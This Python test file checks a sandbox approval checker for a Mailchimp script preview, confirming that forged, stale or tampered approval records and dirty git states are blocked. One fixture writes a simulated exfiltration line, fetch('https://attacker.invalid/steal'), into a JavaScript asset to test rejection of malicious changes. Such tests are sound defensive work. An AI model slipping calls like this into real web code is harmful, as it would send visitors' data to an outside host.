"""Integration tests for the preview-only Mailchimp approval boundary.

Fixtures use disposable repositories and fictional content, not the real candidate.
"""
import hashlib
import json
import os
from pathlib import Path
import subprocess
import tempfile
import unittest

CHECKER = Path(__file__).resolve().parents[1] / "sandbox_check.py"
APP = {"_includes/updates-dialog.html": "M", "assets/js/mailchimp-updates.js": "A"}
MAINTENANCE = {"scripts/sandbox_check.py": "M", "scripts/tests/test_mailchimp_script_approval.py": "A"}


class MailchimpApprovalTest(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name) / "repo"
        self.root.mkdir()
        self.git("init", "-q")
        self.git("config", "user.email", "test@example.invalid")
        self.git("config", "user.name", "Test")
        self.put("_includes/updates-dialog.html", "<p>old</p>\n")
        self.put("scripts/sandbox_check.py", "# old checker\n")
        self.put("_data/i18n/en.yml", "title: old\n")
        self.put("_data/i18n/es.yml", "title: old\n")
        self.git("add", ".")
        self.git("commit", "-qm", "base")
        self.git("update-ref", "refs/remotes/origin/main", self.git("rev-parse", "HEAD"))
        self.base = self.git("rev-parse", "HEAD")
        self.git("checkout", "-qb", "sandbox/mailchimp-script-preview")
        self.put("_includes/updates-dialog.html", '<script src="/assets/js/mailchimp-updates.js"></script>\n')
        self.put("assets/js/mailchimp-updates.js", "console.log('fixture');\n")
        self.put("scripts/sandbox_check.py", CHECKER.read_text())
        self.put("scripts/tests/test_mailchimp_script_approval.py", "# reviewed fixture\n")
        self.git("add", ".")
        self.git("commit", "-qm", "candidate")
        self.head = self.git("rev-parse", "HEAD")
        self.behavior = self.record("mailchimp-script-preview", APP, "1000000001.000001", "1000000002.000002")
        self.maintenance = self.record("mailchimp-script-maintenance", MAINTENANCE, "1000000003.000003", "1000000004.000004")
        self.behavior_path = Path(self.temp.name) / "behavior.json"
        self.maintenance_path = Path(self.temp.name) / "maintenance.json"
        self.save_records()

    def git(self, *args):
        return subprocess.run(["git", "-C", str(self.root), *args], check=True, capture_output=True, text=True).stdout.strip()

    def put(self, name, text):
        path = self.root / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
        path.chmod(0o644)

    def record(self, purpose, files, question, answer):
        return {"version": 1, "purpose": purpose, "sandbox_id": "mailchimp-script-preview",
                "authorizer_id": "UFIXTURE", "source": {"channel_id": "CFIXTURE", "question_ts": question, "answer_ts": answer},
                "checkout": str(self.root.resolve()), "base_commit": self.base, "head_commit": self.head,
                "files": [{"path": name, "mode": "100644", "working_mode": format((self.root / name).stat().st_mode & 0o7777, "04o"), "sha256": hashlib.sha256((self.root / name).read_bytes()).hexdigest()} for name in files]}

    def save_records(self, attest=True):
        for path, data in ((self.behavior_path, self.behavior), (self.maintenance_path, self.maintenance)):
            path.write_text(json.dumps(data), encoding="utf-8")
            path.chmod(0o600)
        if attest:
            self.behavior_digest = hashlib.sha256(self.behavior_path.read_bytes()).hexdigest()
            self.maintenance_digest = hashlib.sha256(self.maintenance_path.read_bytes()).hexdigest()

    def check(self, behavior=True, maintenance=True, attest=True):
        cmd = ["python3", str(self.root / "scripts/sandbox_check.py"), "--json"]
        if behavior:
            cmd += ["--mailchimp-script-approval-file", str(self.behavior_path)]
        if maintenance:
            cmd += ["--mailchimp-script-maintenance-approval-file", str(self.maintenance_path)]
        if attest and behavior:
            cmd += ["--mailchimp-script-review-sha256", self.behavior_digest]
        if attest and maintenance:
            cmd += ["--mailchimp-script-maintenance-review-sha256", self.maintenance_digest]
        result = subprocess.run(cmd, cwd=self.root, capture_output=True, text=True)
        return result

    def test_reviewed_preview_fixture_passes_with_both_records(self):
        result = self.check()
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
        self.assertEqual(json.loads(result.stdout)["blocking"], [])

    def assert_blocked(self, result):
        self.assertEqual(result.returncode, 1, result.stdout + result.stderr)
        self.assertTrue(json.loads(result.stdout)["blocking"])

    def test_both_distinct_approvals_required(self):
        for behavior, maintenance in ((False, False), (True, False), (False, True)):
            with self.subTest(behavior=behavior, maintenance=maintenance):
                self.assert_blocked(self.check(behavior, maintenance))

    def test_wrong_provenance_and_schema_are_rejected_for_both_records(self):
        import copy
        mutations = [
            lambda r: r.update(authorizer_id=""),
            lambda r: r["source"].update(channel_id="wrong"),
            lambda r: r["source"].update(question_ts="invalid"),
            lambda r: r["source"].update(answer_ts="invalid"),
            lambda r: r.update(version=True),
            lambda r: r.update(purpose="mailchimp-script-preview" if r["purpose"] == "mailchimp-script-maintenance" else "mailchimp-script-maintenance"),
            lambda r: r.update(extra="unauthorized"),
            lambda r: r.update(checkout="/other/checkout"),
        ]
        original = (copy.deepcopy(self.behavior), copy.deepcopy(self.maintenance))
        for index in (0, 1):
            for number, mutate in enumerate(mutations):
                with self.subTest(record=index, mutation=number):
                    self.behavior, self.maintenance = copy.deepcopy(original)
                    mutate((self.behavior, self.maintenance)[index])
                    self.save_records()
                    self.assert_blocked(self.check())

    def test_wrong_base_head_branch_and_merge_base_are_rejected(self):
        import copy
        for index in (0, 1):
            for key in ("base_commit", "head_commit"):
                with self.subTest(record=index, key=key):
                    old = copy.deepcopy((self.behavior, self.maintenance)[index])
                    (self.behavior, self.maintenance)[index][key] = "0" * 40
                    self.save_records()
                    self.assert_blocked(self.check())
                    if index == 0:
                        self.behavior = old
                    else:
                        self.maintenance = old
        self.save_records()
        self.git("checkout", "-qb", "sandbox/not-mailchimp")
        self.assert_blocked(self.check())
        self.git("checkout", "-q", "sandbox/mailchimp-script-preview")
        self.git("update-ref", "refs/remotes/origin/main", self.head)
        self.assert_blocked(self.check())

    def test_missing_extra_duplicate_and_stale_inventory_rejected(self):
        import copy
        originals = (copy.deepcopy(self.behavior), copy.deepcopy(self.maintenance))
        for index in (0, 1):
            for mutation in ("missing", "extra", "duplicate", "digest", "mode", "working_mode"):
                with self.subTest(record=index, mutation=mutation):
                    self.behavior, self.maintenance = copy.deepcopy(originals)
                    files = (self.behavior, self.maintenance)[index]["files"]
                    if mutation == "missing":
                        files.pop()
                    elif mutation == "extra":
                        extra = copy.deepcopy(files[0]); extra["path"] = "assets/js/other.js"; files.append(extra)
                    elif mutation == "duplicate":
                        files.append(copy.deepcopy(files[0]))
                    elif mutation == "digest":
                        files[0]["sha256"] = "0" * 64
                    elif mutation == "mode":
                        files[0]["mode"] = "100755"
                    else:
                        files[0]["working_mode"] = "0755"
                    self.save_records()
                    self.assert_blocked(self.check())

    def test_dirty_worktree_and_index_and_hidden_entries_rejected(self):
        target = self.root / "_includes/updates-dialog.html"
        original = target.read_bytes()
        target.write_bytes(original + b"changed")
        self.assert_blocked(self.check())
        self.git("add", "_includes/updates-dialog.html")
        self.assert_blocked(self.check())
        self.git("reset", "-q", "HEAD", "--", "_includes/updates-dialog.html")
        target.write_bytes(original)
        self.git("update-index", "--assume-unchanged", "_includes/updates-dialog.html")
        self.assert_blocked(self.check())

    def test_wrong_working_mode_and_symlinked_approved_file_rejected(self):
        target = self.root / "assets/js/mailchimp-updates.js"
        original_mode = target.stat().st_mode & 0o777
        target.chmod(original_mode ^ 0o020)
        self.assert_blocked(self.check())
        target.chmod(original_mode)
        target.unlink()
        target.symlink_to(self.root / "_includes/updates-dialog.html")
        self.assert_blocked(self.check())

    def test_recommitted_altered_behavior_and_maintenance_bytes_rejected(self):
        for name in ("assets/js/mailchimp-updates.js", "scripts/tests/test_mailchimp_script_approval.py"):
            with self.subTest(name=name):
                path = self.root / name
                path.write_bytes(path.read_bytes() + b"\n# changed bytes\n")
                self.git("add", name)
                self.git("commit", "-qm", "changed reviewed bytes")
                self.behavior["head_commit"] = self.maintenance["head_commit"] = self.git("rev-parse", "HEAD")
                self.save_records()
                self.assert_blocked(self.check())
                self.git("reset", "--hard", "-q", self.head)

    def test_reviewed_changed_instruction_file_requires_maintenance_inventory(self):
        name = "docs/agents/fabian-website.md"
        self.put(name, "# changed preview instructions\n")
        self.git("add", name)
        self.git("commit", "-qm", "preview instructions")
        self.behavior["head_commit"] = self.maintenance["head_commit"] = self.git("rev-parse", "HEAD")
        self.save_records()
        self.assert_blocked(self.check())
        self.maintenance["files"] = self.record("mailchimp-script-maintenance", {**MAINTENANCE, name: "A"},
                                                "1000000003.000003", "1000000004.000004")["files"]
        self.save_records()
        result = self.check()
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)

    def test_forged_records_cannot_self_authorize_changed_committed_behavior(self):
        name = "assets/js/mailchimp-updates.js"
        self.put(name, "fetch('https://attacker.invalid/steal');\n")
        self.git("add", name)
        self.git("commit", "-qm", "unreviewed malicious change")
        self.behavior["head_commit"] = self.maintenance["head_commit"] = self.git("rev-parse", "HEAD")
        next(item for item in self.behavior["files"] if item["path"] == name)["sha256"] = hashlib.sha256((self.root / name).read_bytes()).hexdigest()
        self.save_records(attest=False)
        result = self.check()
        self.assert_blocked(result)
        self.assertIn("independently attested", result.stdout)

    def test_forged_records_cannot_self_authorize_changed_committed_maintenance(self):
        name = "scripts/tests/test_mailchimp_script_approval.py"
        self.put(name, "# malicious checker maintenance\n")
        self.git("add", name)
        self.git("commit", "-qm", "unreviewed maintenance")
        self.behavior["head_commit"] = self.maintenance["head_commit"] = self.git("rev-parse", "HEAD")
        next(item for item in self.maintenance["files"] if item["path"] == name)["sha256"] = hashlib.sha256((self.root / name).read_bytes()).hexdigest()
        self.save_records(attest=False)
        result = self.check()
        self.assert_blocked(result)
        self.assertIn("independently attested", result.stdout)

    def test_ignored_build_input_outside_script_and_includes_is_rejected(self):
        exclude = self.root / ".git/info/exclude"
        for name in ("_data/ignored.yml", "_plugins/ignored.rb", "_layouts/ignored.html", "assets/img/ignored.png"):
            with self.subTest(name=name):
                exclude.write_text(name + "\n")
                self.put(name, "injected\n")
                result = self.check()
                self.assert_blocked(result)
                self.assertIn("ignored untracked", result.stdout)
                (self.root / name).unlink()

    def test_approved_file_writable_by_others_is_rejected_even_if_record_matches(self):
        for record, name in ((self.behavior, "assets/js/mailchimp-updates.js"),
                             (self.maintenance, "scripts/tests/test_mailchimp_script_approval.py")):
            for mode in (0o664, 0o646, 0o666):
                with self.subTest(name=name, mode=oct(mode)):
                    target = self.root / name
                    target.chmod(mode)
                    item = next(item for item in record["files"] if item["path"] == name)
                    item["working_mode"] = format(mode, "04o")
                    self.save_records()
                    result = self.check()
                    self.assert_blocked(result)
                    self.assertIn("invalid or duplicate Mailchimp file inventory", result.stdout)
                    target.chmod(0o644)
                    item["working_mode"] = "0644"

    def test_record_digests_are_required_and_cannot_be_swapped(self):
        self.assert_blocked(self.check(attest=False))
        self.behavior_digest, self.maintenance_digest = self.maintenance_digest, self.behavior_digest
        self.assert_blocked(self.check())

    def test_private_provenance_cannot_be_changed_under_attested_digest(self):
        self.behavior["authorizer_id"] = "UOTHER"
        self.behavior["source"]["channel_id"] = "COTHER"
        self.save_records(attest=False)
        self.assert_blocked(self.check())

    def test_passing_policy_does_not_claim_security_approval(self):
        result = self.check()
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
        self.assertIn("independent security", " ".join(json.loads(result.stdout)["notes"]).lower())

    def test_private_record_must_not_be_symlink_or_writable_by_others(self):
        for path in (self.behavior_path, self.maintenance_path):
            with self.subTest(path=path):
                path.chmod(0o666)
                self.assert_blocked(self.check())
                path.chmod(0o600)
                saved = path.with_suffix(".saved")
                path.rename(saved)
                path.symlink_to(saved)
                self.assert_blocked(self.check())
                path.unlink()
                saved.rename(path)

    def test_malformed_and_duplicate_json_rejected(self):
        for path in (self.behavior_path, self.maintenance_path):
            original = path.read_text()
            for content in ("{", '{"version":1,"version":1}'):
                with self.subTest(path=path, content=content):
                    path.write_text(content)
                    self.assert_blocked(self.check())
            path.write_text(original)

    def test_unrelated_committed_structural_or_editable_changes_rejected(self):
        for name, content in (("assets/js/extra.js", "alert(1);"), ("_data/i18n/en.yml", "title: changed")):
            with self.subTest(name=name):
                self.put(name, content)
                self.git("add", name)
                self.git("commit", "-qm", "unapproved change")
                head = self.git("rev-parse", "HEAD")
                self.behavior["head_commit"] = head
                self.maintenance["head_commit"] = head
                self.save_records()
                self.assert_blocked(self.check())
                self.git("reset", "--hard", "-q", self.head)


if __name__ == "__main__":
    unittest.main()
